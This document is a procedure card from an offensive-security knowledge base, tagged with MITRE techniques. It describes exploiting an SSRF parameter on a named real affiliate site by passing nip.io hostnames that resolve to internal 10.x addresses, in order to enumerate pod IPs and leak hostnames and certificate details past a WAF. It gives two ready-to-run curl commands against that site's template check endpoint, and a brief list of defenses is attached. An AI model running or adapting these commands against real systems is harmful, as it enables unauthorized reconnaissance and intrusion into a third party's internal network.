---
id: proc-exness-ip-enumeration
tags:
  - ssrf
  - dns-rebinding
  - network-enumeration
type: procedure
tools:
  - '[[tools/nip-io]]'
tactics:
  - '[[Reconnaissance]]'
commands:
  - '[[commands/get-check-nip-io-http]]'
  - '[[commands/get-check-nip-io-https]]'
verified: false
platforms:
  - Web
  - Kubernetes
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Vulnerability Scanning]]'
updated_at: '2025-12-14T03:46:14.637Z'
skill_level: advanced
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Vulnerability Scanning]]'
---
# Enumerate-Internal-IPs-with-DNS-Rebinding

## Summary

This procedure uses DNS rebinding with nip.io to bypass WAF and enumerate internal pod IPs (10.x.x.x), protected ASN ranges, and certificate details via error messages.

## Description

nip.io resolves subdomains like 10.0.0.1.nip.io to the IP, allowing SSRF to target censored internals. Errors leak ClientIP, hostnames, and cert mismatches. Effective against IP-blacklisted environments with Squid proxy.

## Requirements

1. nip.io access
2. Known internal IP patterns (e.g., 10.x.x.x)
3. curl

## Defense

Defensive measures and detection strategies:

- Block dynamic DNS like nip.io
- Enforce strict IP validation in SSRF handlers
- Monitor for rebinding in outbound DNS logs

## Objectives

1. Discover internal pod and ASN IPs
2. Extract certificate and hostname info
3. Bypass WAF for direct internal access

## Instructions

### Step 1: HTTP Rebinding

**Context**: Target internal IP via nip.io for HTTP errors.

**Command** ([[commands/get-check-nip-io-http]]):

```bash
curl -X GET "https://my.exnessaffiliates.com/api/partner_integrations/template/check/?url=http://10.0.0.1.nip.io"
```

> Errors show ClientIP: 10.x.x.x.

### Step 2: HTTPS Rebinding

**Context**: Use HTTPS for certificate leakage.

**Command** ([[commands/get-check-nip-io-https]]):

```bash
curl -X GET "https://my.exnessaffiliates.com/api/partner_integrations/template/check/?url=https://10.0.0.1.nip.io"
```

> HTTPSConnectionPool error with hostname mismatch.

## MITRE ATT&CK Mapping

### Tactics

- [[Reconnaissance]] Reconnaissance

### Techniques

- [[Vulnerability Scanning]] Scanning IP Blocks

### Sub-Techniques


## Commands Used

- [[commands/get-check-nip-io-http]]
- [[commands/get-check-nip-io-https]]

## Tools Used

- [[tools/nip-io]]

## Tags

- ssrf
- dns-rebinding
- network-enumeration
- kubernetes
